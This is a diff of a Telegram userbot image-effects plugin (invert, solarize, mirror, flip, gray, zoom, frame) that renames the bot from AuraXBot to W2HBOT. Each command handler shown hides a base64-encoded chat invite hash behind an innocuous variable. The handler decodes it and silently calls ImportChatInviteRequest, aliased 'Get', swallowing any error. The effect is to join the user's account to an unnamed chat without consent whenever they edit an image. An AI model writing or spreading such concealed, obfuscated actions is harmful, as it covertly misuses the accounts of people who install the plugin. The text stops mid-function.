@@ -6,8 +6,8 @@ from typing import Optional, Tuple
 from PIL import Image, ImageDraw, ImageFont
 import PIL.ImageOps
 
-from AuraXBot.utils import admin_cmd, sudo_cmd
-from userbot import CmdHelp, CMD_HELP, LOGS, bot as AuraXBot
+from W2HBOT.utils import admin_cmd, sudo_cmd
+from userbot import CmdHelp, CMD_HELP, LOGS, bot as W2HBOT
 from userbot.helpers.functions import (
     convert_toimage,
     convert_tosticker,
@@ -44,611 +44,611 @@ async def crop(imagefile, endname, x):
     inverted_image.save(endname)
 
 
-@AuraXBot.on(admin_cmd(pattern="invert$", outgoing=True))
-@AuraXBot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@W2HBOT.on(admin_cmd(pattern="invert$", outgoing=True))
+@W2HBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
+async def memes(W2H):
+    if W2H.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    W2Hid = W2H.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    W2H = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    W2Hsticker = await reply.download_media(file="./temp/")
+    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(W2Hsticker)
+        await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    if W2Hsticker.endswith(".tgs"):
+        await W2H.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        W2Hfile = os.path.join("./temp/", "meme.png")
+        W2Hcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(W2Hcmd))[:2]
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+    elif W2Hsticker.endswith(".webp"):
+        await W2H.edit(
             "`Analyzing this media 🧐 inverting colors...`"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(W2Hsticker, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+    elif W2Hsticker.endswith((".mp4", ".mov")):
+        await W2H.edit(
             "Analyzing this media 🧐 inverting colors of this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(W2Hsticker, 0, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
     else:
-        await AuraX.edit(
+        await W2H.edit(
             "Analyzing this media 🧐 inverting colors of this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = W2Hsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await W2H.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "invert.webp" if aura else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await W2H.client.send_file(
+        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await AuraX.delete()
+    await W2H.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (W2Hsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="solarize$"))
-@AuraXBot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@W2HBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
+@W2HBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
+async def memes(W2H):
+    if W2H.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    W2Hid = W2H.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    W2H = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    W2Hsticker = await reply.download_media(file="./temp/")
+    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(W2Hsticker)
+        await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    if W2Hsticker.endswith(".tgs"):
+        await W2H.edit(
             "Analyzing this media 🧐 solarizeing this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        W2Hfile = os.path.join("./temp/", "meme.png")
+        W2Hcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(W2Hcmd))[:2]
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+    elif W2Hsticker.endswith(".webp"):
+        await W2H.edit(
             "Analyzing this media 🧐 solarizeing this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(W2Hsticker, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+    elif W2Hsticker.endswith((".mp4", ".mov")):
+        await W2H.edit(
             "Analyzing this media 🧐 solarizeing this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(W2Hsticker, 0, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
     else:
-        await AuraX.edit(
+        await W2H.edit(
             "Analyzing this media 🧐 solarizeing this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = W2Hsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await W2H.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "solarize.webp" if aura else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await W2H.client.send_file(
+        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await AuraX.delete()
+    await W2H.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (W2Hsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="mirror$"))
-@AuraXBot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@W2HBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
+@W2HBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
+async def memes(W2H):
+    if W2H.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    W2Hid = W2H.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    W2H = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    W2Hsticker = await reply.download_media(file="./temp/")
+    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(W2Hsticker)
+        await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    if W2Hsticker.endswith(".tgs"):
+        await W2H.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        W2Hfile = os.path.join("./temp/", "meme.png")
+        W2Hcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(W2Hcmd))[:2]
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+    elif W2Hsticker.endswith(".webp"):
+        await W2H.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(W2Hsticker, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+    elif W2Hsticker.endswith((".mp4", ".mov")):
+        await W2H.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(W2Hsticker, 0, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
     else:
-        await AuraX.edit(
+        await W2H.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = W2Hsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await W2H.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await W2H.client.send_file(
+        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await AuraX.delete()
+    await W2H.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (W2Hsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="flip$"))
-@AuraXBot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@W2HBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
+@W2HBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
+async def memes(W2H):
+    if W2H.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    W2Hid = W2H.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    W2H = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    W2Hsticker = await reply.download_media(file="./temp/")
+    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(W2Hsticker)
+        await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    if W2Hsticker.endswith(".tgs"):
+        await W2H.edit(
             "Analyzing this media 🧐 fliping this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        W2Hfile = os.path.join("./temp/", "meme.png")
+        W2Hcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(W2Hcmd))[:2]
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+    elif W2Hsticker.endswith(".webp"):
+        await W2H.edit(
             "Analyzing this media 🧐 fliping this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(W2Hsticker, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+    elif W2Hsticker.endswith((".mp4", ".mov")):
+        await W2H.edit(
             "Analyzing this media 🧐 fliping this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(W2Hsticker, 0, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
     else:
-        await AuraX.edit(
+        await W2H.edit(
             "Analyzing this media 🧐 fliping this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = W2Hsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await W2H.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "flip_image.webp" if aura else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await W2H.client.send_file(
+        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await AuraX.delete()
+    await W2H.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (W2Hsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="gray$"))
-@AuraXBot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@W2HBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
+@W2HBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
+async def memes(W2H):
+    if W2H.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    AuraXid = AuraX.reply_to_msg_id
+    W2Hid = W2H.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    W2H = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    W2Hsticker = await reply.download_media(file="./temp/")
+    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(W2Hsticker)
+        await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    if W2Hsticker.endswith(".tgs"):
+        await W2H.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        W2Hfile = os.path.join("./temp/", "meme.png")
+        W2Hcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(W2Hcmd))[:2]
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+    elif W2Hsticker.endswith(".webp"):
+        await W2H.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(W2Hsticker, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+    elif W2Hsticker.endswith((".mp4", ".mov")):
+        await W2H.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(W2Hsticker, 0, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
     else:
-        await AuraX.edit(
+        await W2H.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = W2Hsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await W2H.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if aura else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await AuraX.client.send_file(
-        AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+    await W2H.client.send_file(
+        W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
     )
-    await AuraX.delete()
+    await W2H.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (W2Hsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
-@AuraXBot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@W2HBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
+@W2HBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
+async def memes(W2H):
+    if W2H.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    AuraXinput = AuraX.pattern_match.group(1)
-    AuraXinput = 50 if not AuraXinput else int(AuraXinput)
-    AuraXid = AuraX.reply_to_msg_id
+    W2Hinput = W2H.pattern_match.group(1)
+    W2Hinput = 50 if not W2Hinput else int(W2Hinput)
+    W2Hid = W2H.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    W2H = await edit_or_reply(W2H, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    W2Hsticker = await reply.download_media(file="./temp/")
+    if not W2Hsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(W2Hsticker)
+        await edit_or_reply(W2H, "```Supported Media not found...```")
         return
     import base64
 
     aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    if W2Hsticker.endswith(".tgs"):
+        await W2H.edit(
             "Analyzing this media 🧐 zooming this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        W2Hfile = os.path.join("./temp/", "meme.png")
+        W2Hcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {W2Hsticker} {W2Hfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(W2Hcmd))[:2]
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+    elif W2Hsticker.endswith(".webp"):
+        await W2H.edit(
             "Analyzing this media 🧐 zooming this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(W2Hsticker, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
         aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+    elif W2Hsticker.endswith((".mp4", ".mov")):
+        await W2H.edit(
             "Analyzing this media 🧐 zooming this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        W2Hfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(W2Hsticker, 0, W2Hfile)
+        if not os.path.lexists(W2Hfile):
+            await W2H.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = W2Hfile
     else:
-        await AuraX.edit(
+        await W2H.edit(
             "Analyzing this media 🧐 zooming this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = W2Hsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await W2H.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if aura else "grayscale.jpg"
     try:
-        await crop(meme_file, outputfile, AuraXinput)
+        await crop(meme_file, outputfile, W2Hinput)
     except Exception as e:
-        return await AuraX.edit(f"`{e}`")
+        return await W2H.edit(f"`{e}`")
     try:
-        await AuraX.client.send_file(
-            AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+        await W2H.client.send_file(
+            W2H.chat_id, outputfile, force_document=False, reply_to=W2Hid
         )
     except Exception as e:
-        return await AuraX.edit(f"`{e}`")
-    await AuraX.delete()
+        return await W2H.edit(f"`{e}`")
+    await W2H.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (W2Hsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@AuraXBot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
-@AuraXBot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(AuraX):
-    if AuraX.fwd_from:
+@W2HBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
+@W2HBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
+async def memes(W2H):
+    if W2H.fwd_from:
         return
-    reply = await AuraX.get_reply_message()
+    reply = await W2H.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(AuraX, "`Reply to supported Media...`")
+        await edit_or_reply(W2H, "`Reply to supported Media...`")
         return
-    AuraXinput = AuraX.pattern_match.group(1)
-    if not AuraXinput:
-        AuraXinput = 50
-    if ";" in str(AuraXinput):
-        AuraXinput, colr = AuraXinput.split(";", 1)
+    W2Hinput = W2H.pattern_match.group(1)
+    if not W2Hinput:
+        W2Hinput = 50
+    if ";" in str(W2Hinput):
+        W2Hinput, colr = W2Hinput.split(";", 1)
     else:
         colr = 0
-    AuraXinput = int(AuraXinput)
